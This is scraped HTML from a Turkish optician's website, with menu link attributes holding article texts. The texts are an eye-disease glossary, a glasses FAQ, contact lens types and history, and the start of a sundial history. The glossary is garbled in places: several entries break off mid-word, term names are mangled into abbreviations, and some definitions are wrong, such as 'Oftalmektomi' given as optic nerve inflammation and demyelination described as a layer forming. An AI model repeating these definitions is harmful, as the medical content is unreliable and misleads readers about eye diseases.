: Gözyaşı kesesinin iltihabı, doğuştan veya sonradan, akut veya kronik olabilir.Dakriyosistografi : Gözyaşı kanal sisteminin görüntülenmesi yöntemiDakriyosistorinotomi : Gözyaşı kesesi ve burun boşluğu arasında geçiş oluşturulmasıDakriyosistosel : Gözyaşı kesesinin şişmesi.Dakriyosistotomi : Ammon operasyonu. Gözyaşı kesesininMakular d. : 50 yaş sonrası izlenen, yapısal ve işlevsel bozulmaya neden olan makula hastalığıdır. Yeni damar oluşumu ile beraber olan ve olmayan iki tipi vardır.Dekompresyon : Herhangi bir organa sıvı toplanması, doku büyümesi gibi bir neden ile meydana gelen basıncın ortadan kaldırılması için yapılan ameliyat.Dellen : Gözyaşı tabakasının stabilizesinin bozulması sonucu oluşan incelme.Demiyelinizasyon : Sinir liflerini çevreleyen kılıfta meydana gelen tabaka.Dermatoşalazis : Göz kapağının gevşemesi ve sarkması.Diklokasyon : Göz merceğinin çevre dokularla bağlantısını ve merceğin asılı kalması sağlayan liflerde yırtılmaya bağlı merceğin normal yerinden ayrılması durumu.Diplopi : Çeşitli nedenlerle (şaşılık ve şaşılık operasyonları, kas felçleri, travma ve nörolojik hastalıklar vb) cisimleri çift görme durumu.Distrofi : Korneanın genellikle çift taraflı ve kalıtsal distrofileri. 3 anatomik bölgede incelenir.1.Kornea ön yüzünü etkileyen.2.Kornea stromal disrofile.3.Kornea arka yüz tutulumu olan disrofiler.Diverjans : Her iki gözün görme eksenlerinin birbirinden uzaklaşması.Diyoptri : Bir optik sistemin kırma gücü.EEales hastalığı : Retina hastalığıdır. Yeni damar oluşumu ve retina defolmanı eşlik edebilir.Eksentrasyon : Globun orbital içerik ile beraber çıkarılması.Ektropion : Göz kapaklarının dışa doğru dönmesi halidir. Yaşa bağlı veya doğuştan olabilir. Sürekli gözyaşının dışarı akması ve konjonktiva iltihabı ile beraber seyreder.Ekzoftalmus : Bir ya da her iki gözde öne doğru olan anormal çıkıntı, yer değiştirme.Ekzotropya : İki gözün görme eksenlerinin belirgin olarak dışarı kayarak dışa şaşılık oluşması.Elektroretinografi : Retinanın ışığa verdiği cevabı ölçmede kullanılan test. Retina hücrelerinin fonksiyonunu gösterir.Enoftalmus : Göz küresinin yerleşiminin normalden daha geride olma durumu.entropiyon : Kapak kenarının göz küresine doğru döndüğü göz kapağı hastalığı. Dönen kapak kenarları korneaya hasar verebilir. Doğuştan olabileceği gibi yaşa bağlı veya spastik nedenlerle gelişir.Enükleasyon : Göz küresini, bütünlüğünü bozmadan ayırarak çıkarmak.Epifora : Aşırı ve normalden fazla gözyaşı salgılanması durumları.Epikeratofaki : Keratokonus ve miyopa bağlı kırma kusurlarının düzeltilmesinde kullanılan cerrahi müdahale.Ezotropya : Gözlerin belirgin şekilde içe kayması.FFakoemülsifikasyon : Kataraktlı göz merceğinin ultrasonik dalgalarla parçalanarak çıkarılması şeklinde yapılan katarakt ameliyatı tekniği.Felç : Merkezi ya da kas-sinir mekanizmalarında meydana gelen bozukluklara bağlı hareket yeteneğinin kaybı.Forniks : Alt ve üst göz kapaklarının arka yüzü ile karesi arasındaki anatomik boşluklarFoto reseptör : Gözün ışığı algılamasını sağlayan hücreler.Füzyon : Göz tarafından algılanan görüntünün beyinde birleşerek tek bir görüntü şeklini alması ve algılanması.Galaktozemi : Doğuştan katarakt nedenlerinden olup, yağ damlası görünümünde lens kesafeti yaparGler : Göze gelen ışınların yansımasına bağlı hissedilen göz kamaşması.Glioma : Glial dokuda gelişen tümör oluşumu.Glokom : Doğuştan başka bir göz anomalisi olmaksızın doğumla beraber göz içi basıcın yüksek olması ile karakterize.Greft : Canlılığı korunarak, bir yerden alınıp, diğer bölgeye aktarılan doku parçası.G. reddi : Alıcı doku tarafından verici dokunun hasara uğratılması.Göz kapağı yarığı : Gözler açıkken göz kapaklarının oluşturduğu elips şeklinde açıklık.Göz kapağı konjonktivası : Göz kapaklarının arka yüzündeki konjonktiva kısmı.HHabb çizgileri : Doğuştan glokomda uzun süreli ödeme bağlı izlenen çizgilenmeler.Halo : Parlak cisimler etrafında oluşan haleler.Haptik : Göz içi lenslerinin çeşitli şekilde dizayn edilmiş bacak kısımları.Hemianopsi : Görme alanının yarısının görülememesi.Hikrodiseksiyon : Katarakt ameliyatında lens korteksi ile kapsülü arasındaki bağların gevşetilmesi amacı ile sıvı kullanılması.Hipermetropi : Görüntünün retina arkasına düşmesi nedeniyle oluşan görme bozukluğu / kırma kusuru.Hipertelorizm : Genel olarak 2 organ arası uzaklığın normalden fazla olduğunu belirten bir terim.Hipertropya : Gözün görme ekseninin normalden yukarı saptığı şaşılık türü.Korneal h. : Keratokonusta yırtılmaya bağlı, korneanın saydamlığını kaybetmesi.Hiyaloid membran : Ön ve arka liyaloid membran olmak üzere iki kısımdan oluşur.Homosistinüri : Göz merceğinin zamanla aşağı doğru kayması.Hordeolum : Göz kapağı kenarındaki yağ bezlerinin iltihabıdır.İİmplant : Vücudun bir parçası olmadığı halde, aynı görevi görme amacı ile dışarıdan geliştirilen implantasyonLens i. : Katarakt ameliyatında çıkarılan göz merceği yerine konulan yapay lens.İndosiyanin yeşili : Koroidi görüntülemek için kullanılan boya.İnsizyon : Ameliyat anında dokuda yapılan kesim işlemi.İskemi : Bir doku veya organa giden kan akımının azalması veya kesilmesine bağlı meydana gelen hal.İ optik nöropati : Optik sinirleri besleyen damarlarda, kan akımının azalmasına bağlı optik sinirde hasar oluşması.Korneal ü. : Yabancı cisim, kontakt lens kullanımı ve enfeksiyonlar gibi nedenlerle kornea yüzeyinde gelişen yara.KKanaliküloplasti : Göz yaşı kanallarının onarımı veya açılması için yapılan işlemin tümü.Kantoliz : Göz kapağının genişlemesi amacıyla kantal ligamentinin kesilmesiKapsül : Göz merceğinin etrafını saran ön ve arka olmak üzere 2 bölümden oluşup merceği çevreleyen zarımsı yapı, merceğin en dış tabakası.Kapsülotomi : Katarakt ameliyatlarında merceğin kapsülünün açılması.Keratomalazi : Korneanın elastikiyetini kaybederek gevşemesi durumunu tarif eden terim.Keratometri : Kornea merkezinin eğriliğini ölçme işlemi.Vorteks k. : 2i gözde, göz bebeği alt tarafından başlayıp çevreye ışınsal dağılım gösterir.Keratotomi : Kornea eğriliğini değiştirerek miyop ve astigmatın tedavisi için yapılan kesiler.Kese : Göz yaşı kesesiKiyazma : Her 2 gözden gelen oKolobom : Çoğunlukla doğuştan olan, yapılan ameliyatlara veya geçirilen travmalara bağlı gelişebilen, gözün herhangi bir bölümündeki doku eksikliğiKoni k.distrofisi : Koni hücrelerinin hasarına bağlı olarak düşük görme keskinliği, renk görme kaybı ve ışık kaybı. Makula çevresinde halka şeklinde retina pigment epitel kaybı ve boğa gözü manzarası izlenir.Konjonktivite : Konjonktiva dokusunun çeşitli iç ve dış etkenlere bağlı olarak kızarık, akıntı, şişlik gibi bulgularla karakterize iltihabı.Kornea : Gözün ön bölümünden şeffaf, damar içermeyen, saat camı şeklinde bir doku olup gözün kırma gücü en iyi yapısıdır. Beş ayrı tabakadan oluşur, dıştan içe sayarsak ; epitel, bowman, stroma demse ve endotel.K.farinata : Korneal dejenerasyon.Korteks : Göz merceğinin nükleus'unu örtüp çevreleyen yumuşak yapıdaki dış tabakadır ve kapsülle çevrelenmiştir.LLagoftalmus : Göz kapakların çeşitli nedenlere (felç gibi) bağlı olarak yeterince kapanamaması durumu.Lakrima : Göz yaşı, göz yaşı sıvısı.Lens : Göz merceği de denir. Korteks dış tabaka epinükleus orta ve nukleus denen çekirdekten oluşur. Göze gelen ışığın odaklanmasından ve kırılmasından sorumludur.Lentikonüs : Göz merceğinde önde veya arkada konik çıkıntı oluşumuLevator : Göz kapaklarının açılmasını sağlayan kaslar.Lüksasyon : Lensin zonüler bağlantılarından ayrılarak normal pozisyonunu kaybetmesi durumu.MMadarozis : Kirpik ve kaşlardaki dökülme.Megalokornea : Kornea çapında doğuştan ortaya çıkan büyüme. Kornea bu halde saydam ve normal durumundadır.Meibomian bezleri : Alt ve üst kapak tarsal konjonktivasında dikey yerleşmiş 25-30 kadar yağ bezi.Meibomianitis : Göz kapağındaki meibomian bezlerin iltihapları.Metamorfopsi : Nesnelerin normalden farklı eğri büğrü algılanması, görme bozukluğu.Mikroftalmi : Gözlerin normalden küçük olması.Miyasteni : Bazı sebeplerle kaslarda meydana gelen güç kaybı, özellikle günün ilerleyen saatlerinde artan göz kapağı düşüklüğü tanı koymada önemlidir.Miyop : Göze paralel varan ışınların retina önüne düşerek odaklanması.Mooren ülseri : Sebebi tam olarak bilinmeyen ilerleyici ülserdir. Bir damar iltihabı olarak da tanımlanmaktadır. Ülser zamanla kornea merkezine doğru ilerler. Yaşarma, ışıktan rahatsız olma, ağrı klinik bulgularıdır. İyileşme döneminde yaygın damarlanma bırakır.Multipi skleroz : Bir sinir hastalığıdır. Gözde, klinik olarak arka optik nöropati meydana gelebilir.NNanoftalmus : Gözün normalden küçük olması. Hipermetrop ve ön kamara darlığı nedeni ile açı kapanması glokomuna eğilim vardır.Nekrotizan :  Korneanın stroma tabakasının viral iltihabına bağlı gelişen korneada doku yıkımı.Neovaskülarizasyon : Yaşa bağlı maküler dejenerasyonların %10’unu oluşturur. Makula bölgesindeki retina altı dokuda yeni damar oluşumu ile karakterizedir.Nörotrofik korneal keratit : Bazı sebeplerle bozulmuş korneal uyarım sonucu azalmış göz yaşı salınım sonucu gelişen kornea iltihabı.O ve ÖOftalmektomi : Optik sinirin iltihabı.Oftalmopleji : Kas hareket bozukluğu grubu.Ortoforya : Her iki gözün orta hatta sabit durduğu ve kaymanın olmadığı durum.Ortoptiks : Göz kaslarının etkin biçimde çalıştırılması amacı ile kullanılan yöntem.Ortoskop : Göz tembelliği, şaşılık gibi göz kasları anomalliklerinde tedavi için kullanılan alet.Ödem : Künt göz travmalarından sonra sıvı birikimi. Genellikle kendiliğinden çözülür.PPakiblefaron : Göz kapaklarının kenarında meydana gelen kalınlaşma hali.Pakimetre : Kornea kalınlığını ölçmede kullanılan alet. Kornea kalınlığının ölçülmesi endotel bütünlük hakkında bilgi verir. Optik ve sonik 2 farklı yöntemle ölçüm yapılabilir.Persepsiyon : Işık uyarımının algılanıp optik sinirler aracılığıyla beyine iletilmesi. Işığın göz tarafından algılanabilmesi durumu.Ptoz : Üst göz kapaklarında, kapağın yükselmesini sağlayan kaslarda meydana gelen problem, kapak düşüklüğü. Nedenleri arasında kas ve sinir hastalıkları (sinir felci gibi) göz kapak travmaları, tümörleri sayılabilir.RRefraksiyon : Gözün kırma gücü ve görsel kırılma kusurlarının düzeltilmesiyle ilgili optik bilimi.Retinoblastoma : Çocuklukta sık görülen kötü huylu göz tümörü. Genetik geçişe müsait olduğundan ailevi olabilir.Santral seröz koroido r. : Orta yaş erkekleri etkileyen, çoğu 6 ay içinde kendiliğinden iyileşen durum.Retinopati : Dağınık ve yüzeysel soluk alanlar, retina içinde kanamalar, optik disk şişmesi.Retinoskopi : Gözün kırma kusurlarının tespit işlemi.S ve ŞSchirmer testi : Kuru göz tanı yöntemleri gözyaşının temel ve refleks salgılamasını ölçmek için kullanılır.Schirmer kağıt ucundan kıvrılarak alt kapağın dış kısmına yerleştirilerek 5 dakika bekletilir.Kağıdın on beş milimetresinin ıslanması gerekir. Daha az değerlerde, gözyaşı su katında azalma olduğu belirlenir.Skotom : Görme alanında algılanamadığı için görülmeyeni ifade eder. Görme yollarının herhangi bir seviyesinde problemlere bağlı olabilir.Steropsi : 3 boyutlu görme.Supresyon : Eğer iki gözden görme alanına varan uyarılar arasında dengesizlik varsa, daha net görüntü baskın çıkar, diğer görüntü baskılanır. Bu baskılamaya supresyon denir.Şalazyon : Kisttik genişleme.Şaşılık : Normalde her 2 gözün görme noktası ile yapılan tespitlime sonucu gözler düz bir doğrultudadır. Bir gözün görme noktası fiksasyon yapılan cisme bakarken, diğer gözün görme noktası yöne yönelmiş ise bu durumda kaymadan söz edilir.U ve ÜUyum : Göz merceğinin kırma gücünü arttırarak yakına odaklanması işlemi.Ülser : Yüzeysel ve lokal doku ölümü. Korneal ülser : Travma, yabancı cisimler, lens kullanımı ve enfeksiyonlar gibi nedenlerle kornea yüzeyinde gelişen yara alanları. Tropik kornea ülseri : Bozulmuş kornea duyusuı ve göz yaşı salgısının azalması sonucu stroma ya kadar ilerleyebilen, steril kornea ülseri." href="/index.php?option=com_content&amp;view=article&amp;id=96:goez-hastalklar-soezlueue&amp;catid=45:goezluek-hakknda&amp;Itemid=144">  			Göz Hastalıkları Sözlüğü</a>  			</li>  			<li>  			<a title="Dinlendirici gözlük işe yarar mı?Dinlendirici gözlük ülkemize has bir terim. Sadece gözlük satışlarını arttırabilmek adına uydurulmuş bir masal aslında.Gözlüğün dinlendiricisi olamaz, çünkü gözlük ; miyop, astigmat, hipermetrop gibi göz kusurlarını düzeltmek amacıyla kullanılan, yardımcı bir araçtır.  Dolayısıyla göz kusuru olmayan hastalarda ortada bir sorun olmadığından bir fayda da sağlayamaz, aynı zamanda göz yorgunluğu, bir göz kusuru değildir. Dinlenildiğinde geçen anlık bir rahatsızlıktır, geçmiyorsa bir doktora başvurmanın zamanı gelmiştir.Dinlendirici gözlük adı ile satılan malum gözlükler ise olsa olsa psikolojik bir rahatlama sağlayabilir, temelde hiçbir sorunu çözmez. Kırma kusuru olmayan bir göze, o hafif numaralı dinlendirici gözlükler takıldığında görmeyi etkileyeceğinden sağlıklı bir gözde yorgunluk ve baş ağrısına neden olabilir.Eğer gözlüğün size yakıştığını düşünüyor ve bir farklılık arıyorsanız numarasız camlı gözlükleri tercih edebilirsiniz. Her marka ve modele numarasız gözlük camları takılabilmektedir, sitemizden güneş gözlüğü ve numaralı gözlük çerçevesi beğenebilir, mağazamızı ziyaret edebilirsiniz.Bilgisayar başında çok vakit geçirmek, TV seyretmek görme bozukluğuna neden olur mu?Hayır. Tahmin edilenin aksine günlük hayata yerleşen, çoğu insanın hayatının bir parçası hatta işi haline gelen bilgisayar kullanımı gözlere kalıcı bir zarar vermez. Aynı şekilde, kitap okumak, televizyon seyretmek gibi günlük aktiviteler de doğru yapıldığında gözü etkilemez.Dikkat ve odaklanma gerektiren bu aktiviteler esnasında göz kırpma azalmakta ve göz kuruluğuna neden olmakta sonucunda ise kızarıklık, yanma, batma hissi vb şikayetler oluşmaktadır. Bu şikayetleri azaltmak için bulunulan odanın nemlendirilmesi, 10-20 dk aralıklarla 40 sn kadar gözlerin kırpıştırmak, uzak nesnelere odaklanmak gibi önlemler alınabilir. Göz kuruluğu ve alerjisi gibi şikayetlerde göz doktoruna başvurmakta fayda var.Miyop hastalarının gözlük kullanmaları numaralarını düşürür mü? Arttırır mı?Kullandığınız gözlükler sadece gözümüzde oldukları sürece görüşümüzü düzeltirler. Özellikle miyop göz kusuru olan hastalar tarafından kullanılan gözlüklerin tedavi edici yahut tam tersine ilerletici bir etkisi olmaz.Özet olarak gözlük kullanmak ile göz kusurumuzun derecesine etki edemeyiz.40 yaş sonrası yakını görmede azalma olmasının nedeni nedir?Gözümüz yakını görebilmek için odaklanmalıdır, bu odaklama kabiliyeti için gereken ise göz merceğinin şeklini değiştirmesidir.40'lı yaşlardan itibaren esnekliğini kaybederek sertleşen göz merceği gençlikte olduğu gibi odaklama yapamaz. Bu nedenle yakın görme kaybı yaşarız ve yardımcı bir araç olan gözlük kullanımı gerekli hale gelir. Yaygın bilinişin aksine, yakın gözlüğü kullanmak göz numarasının artmasına neden olmaz.Her 2 senede bir, numaranın ortalama 0.25 kadar artması gözlük kullanımından değil yukarıda bahsetmiş olduğumuz yaşlılıktan ileri gelen doğal bir artıştır.Çocuklarımızı kaç yaşında göz muayenesine götürmeliyiz?Yanlış olan bir diğer kanıda çocuklarda ortaya çıkan göz sorunlarının büyüdüklerinde geçeceğidir. Halbuki bu sorunların bir çoğunun aciliyeti vardır ve tedavi edilmesi gerekir. Bebeklikten itibaren uzman göz doktorlarına çocukların gözleri muayene ettirilebilir.Dışarıdan bakıldığında görülen kayma, şaşılık, göz bebeğinin üzerinde beyazlama, çapaklanma ve gözlerdeki her türlü şekil bozuklukları acil tedavi edilmesi gereken ciddi sorunlardır.Mesela doğuştan katarakt ilk haftalarda (1-2 hafta) tedavi edilmediğinde görme kalıcı olarak kaybedilmektedir.Dışarıdan görülen hiçbir sorunu olmayan çocukların ise 3 ila 4 yaş arasında göz muayenesinden geçirilmeleri ileride oluşabilecek sorunlara önceden tedbir alınması için önemlidir.Astigmat nedir? Diğer göz kusurlarından farkı var mıdır?Astigmat kırma kusurunun bazı eksenlerin daha kırıcı bazılarının ise daha az kırıcı olması durumudur. Aslında bir göz hastalığı değil, bir çeşit kırma kusurudur.Astigmatlı hastaların gözlüklerini kullanmaya nispeten daha zor alışmalarının nedeni, kırma kusurunun gözlükle ortadan kaldırılmasından itibaren bir süre daha devam etmesidir. Bu nedenle astigmatlı camlara alışmak nispeten zordur, astigmat düzeltici gözlüğü sürekli kullanarak alışmak, bir gün takıp, bir gün takmayarak rahatsızlık çekmekten daha kolaydır.Genellikle astigmatlı hastalar gözlüklerine 7-15 gün arasında alışmaktadırlar.Katarakt nedir? Nasıl tedavi edilir?Katarakt göz merceğinin bazı sebeplerle saydamlığını kaybetmesi ve ışık geçirmez hale gelmesidir. En sıklıkla rastlanan sebep yaşlılıktır. Göz merceği saçlarımızın beyazlaşması gibi ilerleyen yaşlarda saydamlığını kaybederek görmemizde bozulmaya neden olur.Nasıl tedavi edilir?Katarakt tedavisi cerrahi yollarla yapılır. Damla kullanmak, gözlük takmak gibi ameliyat dışında ki yöntemler ile tedavi edilemez. Katarakt ameliyatı ile saydamlığını kaybetmiş olan göz merceği alınarak yerine yapay bir mercek yerleştirilir.Lazer cerrahisi katarakt ameliyatlarında günümüzün en modern tekniğidir. Anestezi narkoz kullanılmadan damlalar yardımıyla sağlanır. Hasta mercek lazer ile eritilip, yerine yapay mercek konulmaktadır. 15-20 dakika kadar süren bir ameliyattır.Lazer tedavisi kimlere uygulanır? Lazer risklimidir?Lazer basit anlamıyla enerji taşıyan bir tür ışıktır diyebilir, mercek ve güneş ışığı yardımı ile kağıt yakılmasına benzetebiliriz. Temeli hedef dokunun lazer ile yakılıp parçalanabilmesine dayanan lazer cerrahisi, göz ile ilgili olarak kırma kusurlarının giderilmesinde kullanılır.Riskli midir? Her ameliyatta olabileceği gibi lazer cerrahisinde de düşükte olsa komplikasyonların ortaya çıkma ihtimali vardır. Düşük numaralarda ve önemsiz sayılabilecek göz kusurlarında küçükte olsa bu riski almak gereksizdir. Konusunda uzman merkezlerle irtibata geçerek hatta birden fazla merkez ile görüş alışverişinde bulunarak dezavantajlarını öğrenmenizi, durumunuzu analiz ettirmenizi öneririz." href="/index.php?option=com_content&amp;view=article&amp;id=97:8-soruda-goezluek&amp;catid=45:goezluek-hakknda&amp;Itemid=145">  			8 Soruda Gözlük</a>  			</li></ul>
+		</div>		</div>		</div>
+		  
+		<div class="jazin-center" style="width:33%">
+				<div class="jazin-boxwrap jazin-theme">		<div class="jazin-box">			<div class="jazin-content clearfix">				<h4 class="jazin-title"><a href="/index.php?option=com_content&amp;view=article&amp;id=108:dene&amp;catid=47:lensler" title="Lensler">Lensler</a></h4>				<img src="http://yenisafak.com.tr/resim/site/lens2a2e79ba2a128328by.jpg" alt="Lensler" width="50" height="50" align="right" />				Ayni elinizin orta parmağını kirpiklerinize olabildiğince yaklaştırın ve alt göz...
+</p>
+							</div><strong class="jazin-more">Makaleler:</strong>
+<ul class="jazin-links">
+  			<li>  			<a title="Günümüzde temel olarak iki çeşit lens vardır. Bunlar gaz geçirgen sert lensler ve yumuşak lenslerdir. Gaz geçirgen sert lenslerin  kullanımının gerektiği birkaç durum dışında çoğunlukla yumuşak lensler kullanılır.  Gaz geçirgen sert lensler: Göze oksijen geçişine izin verdikleri için bu adi alırlar ve bu özellikleri nedeniyle artık kullanılmayan sert lenslere göre kornea epitel metabolizmasını daha az bozarlar. Korneanın seklini almadıkları için yüksek astigmatizma ve keratokonus gibi olgularda özellikle tercih edilirler.  Yumuşak lensler: Çok değişik tipleri vardır. Günlük kullanılan 1 gün ömürlü lensler, günlük kullanılan 1 ay ömürlü lensler, günlük kullanılan 3 ay ömürlü lensler, günlük kullanılan 1 yıl ömürlü lensler, 1 hafta kullanılan 1 hafta ömürlü lensler, 1 ay kullanılan 1 ay ömürlü lensler, bazı göz hastalıklarının tedavisi için kullanılan tedavi edici lensler, bifokal lensler ve renkli lensler gibi. Bunların kullanımı oldukça rahattır. Gözdeki kusurun tashihi için kullanılan lenslerin çoğu renksizdir ve göze takıldığında görünümü değiştirmezler. Takıldıkları sürece kusuru giderir ve berrak bir görüntü sağlarlar. Kornea yüzeyini bozan hastalıklar sinir uçlarının dışarıda kalmasına bağlı olarak hastaya yoğun bir huzursuzluk verirler. Eski lazer uygulamalarında da kornea sinir uçları açıkta kalır ve hasta yoğun ağrı duyardı. Bu gibi durumlarda hastanın tedavisi amacıyla tedavi edici yumuşak kontakt lensler kullanılır. Bifokal lensler, yakın ve uzak için iki ayrı gözlük kullanmak zorunda kalan kişiler için geliştirilmiştir. Günümüzde çok popüler olan bir lens grubu da renkli lenslerdir. Gözdeki kusurun düzeltilmesi amacıyla kullanılabildiği gibi herhangi bir kusur olmadan da sırf estetik amaçlı olarak kullanılan numarasız tipleri vardır. Renk seçenekleri çok fazladır. Renkli lensler her gözde katalogda gösterildiği gibi durmaz. Bu nedenle değişik seçenekleri deneme imkanı tanıyan bir merkezde göz muayenesinin ardından denenerek alınmasında fayda vardır. " href="/index.php?option=com_content&amp;view=article&amp;id=109:lens-ceitleri&amp;catid=47:lensler">  			Lens Çeşitleri</a>  			</li>  			<li>  			<a title="Kontak lenslerin gelişimi; Bazı kaynaklar kontakt lensler üzerine ilk görüşlerin Rönesans dönemine dek uzandığını bildirmekle birlikte, ilk tanımlama 1845'de İngiliz astronom John Frederick William Herschell'e aittir. İlk kontakt lens ise 1886' da Xavier Galezowski tarafından katarakt cerrahisi sonrasında yara yeri iyileşmesini kolaylaştırmak amacıyla yapılmıştır. Keratokonus hastalarına yönelik ilk kontakt lens ise Fransa'da 1888'de Eugene Kalt tarafından üretilmiştir.  Lens dizaynına ilişkin önemli gelişmeler 1930'larda Joseph Dallos öncülüğünde Macarlar tarafından gerçekleştirilmiştir. 1930'lara kadar kontakt lens için kullanılan tek materyal cam iken bu tarihlerden itibaren cama göre çok hafif bir materyal olan bir pleksiglas, polimetilmetakrilat (PMMA) bu alana gire-rek lensin sadece kornea üzerinde durabilmesine olanak tanımıştır. Yine ayni yıllarda ilk rigid gaz geçirgen lensler olan Selüloit (selüloz asetat bütirad) lensler ilk kez kullanılmıştır.  Modern lens çağının başlangıcı, 1948'de Amerikan Kevin Tuohy'in PMMA'dan yapılan Solexlens ismindeki  korneal lensi insanlarda kullanmasının olduğu kabul edilir. 1950'ler polimerize hidroksietilmetakrilat (HEMA) maddesinden yapılan hidrojel lenslerin (su içeren) girmesi ile çok önemli bir sürecin başlamasına sahne olmuştur. Bu ilk yumusak lens Prag'da Otto Wichterle, Daroslav Lim ve Maximillian Dreifus tarafından üretilmiştir. Bu lenslerin seri üretimine olanak tanıyan spin-cast makinesi 1966'da yine Wichterle'nin icadıdır.  1970'lerde sert lenslerde önemli bir gelişme olmuş, oksijen geçirmeyen PMMA materyalinin yerine oksijen geçirebilen rigid gaz geçirgen lensler (RGP) , CAB, Silikon akrilat ve daha sonra florokarbon materyallerden üretilmişlerdir. 1990'larin başında yumuşak lens üretim teknolojisi değişmiş ve kopyalama sisteminin girişi ile planlı aylık değişim lensleri kullanıma girmiştir.  1996 yılından itibaren de Florosilikon hidrojel kontakt lenslerin icadıyla yumuşak kontakt lenslerin oksijen geçirgenlikleri çok arttırılmış ve lensler gece aşırı kullanılabilir hale gelmişlerdir. Kontak lens nedir  Kontak lensler, kornea yüzeyine yerleştirilerek gözdeki kusurların tashihi veya bazı hastalıkların tedavisi için kullanılan lenslerdir. Refraksiyon ve optikle ilgili ilkeler gözlüklere benzer şekilde kontakt lenslere de uygulanır. Bunlar, miyopi ve hipermetropi derecesine göre kornea eğriliğini bir kontakt lens yüzeyi ile değiştirerek var olan kusuru düzeltirler. Astigmatizmalarin çoğunlukla kornea ön yüzeyinin çarpıklığı sonucu oluşmasından dolayı ya sert kontakt lenslerin kullanılması ya da özel olarak astigmatizmaya yönelik üretilmiş yumuşak lenslerin kullanılması gerekir. Miyop veya  hipermetroplar için üretilmiş ve fiyatı cazip olan yumuşak kontakt lensler en fazla -1,0 diyoptri kadar bir astigmatizmayi düzeltebilirler. Küçük numaralarda gözlük ve kontakt lens numaraları ayni iken numara arttıkça miyopların gözlüğe göre daha küçük, hipermetropların ise daha büyük numaralı bir lens kullanmaları gerekir. Son yıllarda kontakt lens teknolojisi çok gelişmiş ve lenslerin kullanımını kolaylaştıran ve kullanım süresini uzatan yeni tasarım ve materyaller geliştirilmiştir. " href="/index.php?option=com_content&amp;view=article&amp;id=110:lens-nedir&amp;catid=47:lensler">  			Lens Nedir?</a>  			</li></ul>
+		</div>		</div>		</div>
+		  
+		<div class="jazin-right" style="width:33%">
+				<div class="jazin-boxwrap jazin-theme">		<div class="jazin-box">			<div class="jazin-content clearfix">				<h4 class="jazin-title"><a href="/index.php?option=com_content&amp;view=article&amp;id=98:saatin-cad-ve-en-eski-saat-tuerleri&amp;catid=46:saat-hakknda&amp;Itemid=146" title="Saatler">Saatler</a></h4>				<img src="http://www.techfresh.net/wp-content/uploads/2007/02/dt-time-wristwatch_2.jpg" alt="Saatler" width="50" height="50" align="right" />				İnsanoğlu başlangıçtan bu yana zaman denilen kavramla uğraşmış, yıldızlara ve gü...
+							</div><strong class="jazin-more">Makaleler:</strong>
+<ul class="jazin-links">
+  			<li>  			<a title="Güneş SaatleriZamanı ölçmek için ilk çabalar güneş saatiyle başlamıştır. Bu ilk saatler, yüzyıllar boyunca zamanın ölçülmesi için kullanılan en yaygın araç olmuşlardır. Güneş saatleri, özel olarak hazırlanmış bir milin gölgesinin, Güneş'in görünen hareketine uygun olarak yine özel olarak hazırlanmış mermer, taş veya madeni bir zemin (kadran) üzerindeki hareketine göre zamanın ölçülmesine yarayan araçlardır. Saat, güneşin oluşturduğu gölgeyi ölçer. Bu yüzden güneş saatleri ancak bol güneşli ülkelerde ve gündüzleri kullanılabiliyordu.Saat sisteminin gelişmesi tamamıyla dinî sebepler yüzündendi. Mısır dilinde saat anlamına gelen "wnwt" aynı zamanda rahiplerin yaptığı dini görev anlamına da geliyordu. Gündüz saatleri, Güneş Tanrısı Ra'nın ilerleyişine göre ölçülüyordu ve rahipler güneşin yolunu izlemek için değişik şekillerde yapılmış güneş saatleri kullanıyorlardı.M.Ö. 3500'lerde yapılmaya başlayan ve ilk zaman ölçme aracı sayılabilecek obeliskler, aynı zamanda tarla parselasyonunda da kullanılıyorlardı. Uzun, yukarı doğru incelen dörtgen yapının üst sivrisi kare biçimindeki düzlemin ortasında değil kenara kaymış olarak yapılıyordu. Hareket eden gölge, günü ikiye bölerek zamanı gösteriyordu. Yılın değişik zamanlarında gölge uzunlukları işaretlenip en uzun ve en kısa olanı bulunuyor ve böylece yılın en kısa ve en uzun günü de belirlenebiliyordu.Güneş saatlerinin bir başka çeşidi de T şeklindeki saatlerdir. T biçiminde birbirine bağlanmış iki çubuktan oluşan bu saatlerde kısa çubuğun gölgesi uzun sapın üzerindeki numaralara düşüyordu. Sabahları doğuya doğru, öğleden sonraları ise batıya doğru tutulan saatte, 1'den 10'a kadar sayılar kullanılıyordu. Taşınabilen ilk zaman aracı olan bu saat, M.Ö. 1500'lerde kullanılmaya başlanmıştır. Bu alet, günü 10 parçaya ve sabah ile akşam olmak üzere iki 'alacakaranlık saatler'ine bölüyordu. T biçimindeki güneş saatlerinde, günün ilk ve son saatlerinde gölgenin sonsuza kadar uzaması ve kadran üzerinde izlenememesi sorun yaratıyordu.Güneş saati tasarımındaki en büyük gelişme, gündüz saatlerini eşit dilimlere ayırabilmeyi sağlayan yarım küre biçimidir. M.Ö. 300 yıllarında Keldani astronom Berossus'un bulduğu bu tip saatlerde yarımküre içbükey olarak yerleştiriliyordu. Herhangi bir günde gölgenin yarımküre üzerinde izlediği yol, Güneş'in gökyüzünde izlediği yörüngenin kopyası oluyordu. 12 eşit bölüme ayrılmış yarımküre üzerinde yörüngeler çizilip, her mevsimle ilişkili saat başları birer eğri ile birleştiriliyordu.M.Ö. 8. yüzyıldan önce yapılmış taşınabilir bir güneş saati. Saat, kısa parçanın gölgesinin sap üzerindeki sıkalaya düşmesi içingüneşe doğru tutuluyor.Sümerlerle başlayıp Mısırlılar ve Babillilerle devam eden güneş saatleri Yunanlılarla daha da geliştirilmiştir. Romalılar ilk güneş saatlerini M.Ö. 1. yüzyılda yapmışlardır. Mimar Vitruvius'un belirttiğine göre, Roma'da çok yaygın olarak kullanılan saatlerin 13 değişik türü bulunuyordu.O dönemin usta matematikçileri olan Araplar daha yaratıcıydılar. Saatçiliğe çok önem veren Araplar güneş saatlerinin birçok ilkesini geliştirmişlerdir. Arapların ünlü düşünürlerinden Abu'l Hasan, eşit saatlerle hesaplama sistemini bularak, 13. yüzyılın başlarında horoloji tarihinin en önemli adımlarından birini atmıştır.İlk çağlarda çabuk gelişme gösteren güneş saatleri ortaçağ boyunca 5-16. yüzyıllar arasında pek ilerlememişlerdir. Ancak, 1500-1800 yılları arasında astronomiye paralel olarak hem çeşit hem de kullanışlılık açısından gelişmişlerdir.En ayrıntılı ve hassas güneş saatleri İslâm güneş saatleridir. İslâmiyet'te namaz vakitlerini bilme isteği güneş saatlerini buna göre ayarlama zorunluluğu getirmiştir. Öğle namazı bir cismin gölgesinin en kısa olmasıyla başlar, gölge o cismin iki misli olduğunda, ikindi namazı 